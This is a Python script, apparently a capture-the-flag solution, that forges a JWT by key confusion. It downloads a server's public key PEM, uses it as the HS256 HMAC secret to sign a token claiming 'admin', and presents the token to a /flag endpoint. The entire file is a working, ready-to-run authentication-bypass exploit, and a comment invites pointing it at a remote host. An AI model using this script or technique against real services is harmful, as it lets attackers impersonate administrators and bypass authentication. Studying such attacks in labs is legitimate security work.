#!/usr/bin/env python3
# exploit_manual.py
# Forge an HS256 JWT using the server's public key PEM as the HMAC secret.
# No PyJWT required.

import requests
import base64
import json
import hmac
import hashlib

def b64url(b: bytes) -> str:
    """Base64url encode without padding, returns str."""
    s = base64.urlsafe_b64encode(b).rstrip(b'=')
    return s.decode('ascii')

def make_hs256_token(secret_bytes: bytes, payload_obj: dict):
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = b64url(json.dumps(payload_obj, separators=(',', ':')).encode('utf-8'))
    signing_input = (header_b64 + "." + payload_b64).encode('utf-8')
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def main():
    url = "http://localhost:11007"  # change to remote host if needed

    # fetch public key text (PEM)
    r = requests.get(url + "/pubkey", timeout=6)
    r.raise_for_status()
    pub_pem = r.text
    print("Public key (first 200 chars):\n", pub_pem[:200])

    # Use the raw PEM bytes as the HMAC secret (like the writeup)
    secret_bytes = pub_pem.encode('utf-8')

    # craft token for admin
    token = make_hs256_token(secret_bytes, {"user": "admin"})
    print("Forged token:", token)

    # send request with cookie
    resp = requests.get(url + "/flag", cookies={"token": token}, timeout=6)
    print("\nStatus:", resp.status_code)
    print("Response:\n", resp.text)

if __name__ == "__main__":
    main()
